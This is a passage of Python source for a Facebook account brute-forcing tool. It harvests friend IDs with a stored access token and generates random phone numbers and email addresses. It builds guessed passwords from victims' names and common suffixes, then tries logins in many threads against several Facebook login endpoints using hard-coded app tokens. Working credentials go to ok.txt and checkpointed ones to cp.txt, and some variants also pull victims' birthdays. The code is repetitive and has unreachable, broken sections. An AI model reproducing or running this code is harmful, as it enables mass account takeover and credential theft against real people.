		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((p+" ["+k+"•"+m+"•"+p+"] Total ID : %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit(p+"\n ["+k+"•"+m+"•"+p+"] Error : %s"%e)

### Krek Nomer su! ###
def random_numbers():
  data = []
  print((p+"\n ["+k+"•"+m+"•"+p+"] Number Must Be 5 Digit"))
  kode=str(input(p+" ["+k+"•"+m+"•"+p+"] Example : 92300,92311,92340\n"+p+" ["+k+"•"+m+"•"+p+"] Input Number: "))
  exit((p+"\n ["+k+"•"+m+"•"+p+"] Number Must Be 5 Digit")) if len(kode) < 5 else ''
  exit((p+"\n ["+k+"•"+m+"•"+p+"] Number Must Be 5 Digit")) if len(kode) > 5 else ''
  jml=int(input(p+" ["+k+"•"+m+"•"+p+"] Amount : "))
  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,7)]) for e in range(jml)]]
  print(p+" ["+k+"•"+m+"•"+p+"] Crack Started, Please Wait...\n")
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  input(p+"\n [BACK]"+p)
  menu()

def random_email():
  data = []
  nama=input(p+" ["+k+"•"+m+"•"+p+"] Target Name : ")
  domain=input(p+" ["+k+"•"+m+"•"+p+"] Choose Domain [G]mail, [Y]ahoo, [H]otmail : ").lower().strip()
  list={
    'g':'@gmail.com',
    'y':'@yahoo.com',
    'h':'@hotmail.com'
  }
  exit(("\033[1;37m ["+k+"•"+m+"•"+p+"] Fill In The Correct")) if not domain in ['g','y','h'] else ''
  jml=int(input(p+" ["+k+"•"+m+"•"+p+"] Amount : "))
  setpw=input(p+" ["+k+"•"+m+"•"+p+"] Set Password : ").split(',')
  print("\033[1;37m ["+k+"•"+m+"•"+p+"] Crack Started, Please Wait...\n")
  [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  input("\n\033[1;37m [BACK]")
  menu()

def jam():
	os.system("clear")
	banner()
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((p+"\n ["+k+"•"+m+"•"+p+"] Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
	        idt= input(p+" ["+k+"•"+m+"•"+p+"] Target File : ")
	        for line in open(idt ,'r').readlines():
	            id.append(line.strip())
	except KeyError:
		print((p+" ["+k+"•"+m+"•"+p+"] ID Not Found"))
		print((p+"\n [BACK]"+p))
		menu()
		r=requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((p+" ["+k+"•"+m+"•"+p+"] Total ID : %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit(p+"\n ["+k+"•"+m+"•"+p+"] Error : %s"%e)

def brute(user, passs):
  try:
    for pw in passs:
      params={
        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'sdk_version': '2',
        'email': user,
        'locale': 'en_US',
        'password': pw,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
      }
      api='https://b-api.facebook.com/method/auth.login'
      response=requests.get(api, params=params)
      if re.search('(EAAA)\w+', str(response.text)):
        print('\x1b[0;32m * --> %s • %s '%(str(user), str(pw)))
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print('\x1b[0;33m * --> %s • %s '%(str(user), str(pw)))
        break
  except: pass


### PASSWORD ###

def generate(text):
	results=[]
	global ips
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"12345")
				results.append("234567")
				results.append("223344")
				results.append("556677")
				results.append("786786786")
				results.append("pakistan")
			else:
				results.append(i+"123")
				results.append(i+"12345")
				results.append("234567")
				results.append("223344")
				results.append("556677")
				results.append("786786786")
				results.append("pakistan")
	return results

### MODULE CRACK ###

def mbasic(em,pas,hosts):
	r=requests.Session()
	r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

def ttll(em,pas,hosts):
	r=requests.Session()
	r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}
def f_fb(em,pas,hosts):
	global ua
	r=requests.Session()
	r.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://free.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}
def touch_fb(em,pas,hosts):
	global ua,touch_fbh
	r=requests.Session()
	r.headers.update({"Host":"touch.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://touch.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://touch.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#touch fb


### BRUTE CRACK ###
	
class crack:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n ["+k+"•"+m+"•"+p+"] Crack With Pass Default/Manual [d/m]"))
		while True:
			f=input(p+" ["+k+"•"+m+"•"+p+"] Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+" ["+k+"•"+m+"•"+p+"] Example : Type Your Choice Pass"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m * --> %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class crackttl:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n ["+k+"•"+m+"•"+p+"] Crack With Pass Default/Manual [d/m]"))
		while True:
			f=input(p+" ["+k+"•"+m+"•"+p+"] Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+" ["+k+"•"+m+"•"+p+"] Example : Type Your Choice Pass"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=ttll(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="cp":
					try:
						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
						tt=json.loads(ke.text)
						ttl=tt["birthday"]
					except:pass
					print(("\r\x1b[0;33m * --> %s • %s • %s \x1b[0m   "%(fl.get("id"),i,str(ttl))))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class crekm:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n ["+k+"•"+m+"•"+p+"] Crack With Pass Default/Manual [d/m]"))
		while True:
			f=input(p+" ["+k+"•"+m+"•"+p+"] Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+" ["+k+"•"+m+"•"+p+"] Example : Type Your Choice Pass"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
				ThreadPool(30).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://m.facebook.com")
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m * --> %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class crekmttl:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n ["+k+"•"+m+"•"+p+"] Crack With Pass Default/Manual [d/m]"))
		while True:
			f=input(p+" ["+k+"•"+m+"•"+p+"] Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+" ["+k+"•"+m+"•"+p+"] Example : Type Your Choice Pass"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
				ThreadPool(30).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=ttll(fl.get("id"),
					i,"https://m.facebook.com")
				if log.get("status")=="cp":
					try:
						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
						tt=json.loads(ke.text)
						ttl=tt["birthday"]
					except:pass
					print(("\r\x1b[0;33m * --> %s • %s • %s \x1b[0m   "%(fl.get("id"),i,str(ttl))))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class tofbe:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n ["+k+"•"+m+"•"+p+"] Crack With Pass Default/Manual [d/m]"))
		while True:
			f=input(p+" ["+k+"•"+m+"•"+p+"] Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+" ["+k+"•"+m+"•"+p+"] Example : Type Your Choice Pass"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
				ThreadPool(30).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://touch.facebook.com")
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m * --> %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class tofbettl:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n ["+k+"•"+m+"•"+p+"] Crack With Pass Default/Manual [d/m]"))
		while True:
			f=input(p+" ["+k+"•"+m+"•"+p+"] Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+" ["+k+"•"+m+"•"+p+"] Example : Type Your Choice Pass"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=ttll(fl.get("id"),
					i,"https://touch.facebook.com")
				if log.get("status")=="cp":
					try:
						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
						tt=json.loads(ke.text)
						ttl=tt["birthday"]
					except:pass
					print(("\r\x1b[0;33m * --> %s • %s • %s \x1b[0m   "%(fl.get("id"),i,str(ttl))))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class freefb:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n ["+k+"•"+m+"•"+p+"] Crack With Pass Default/Manual [d/m]"))
		while True:
			f=input(p+" ["+k+"•"+m+"•"+p+"] Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
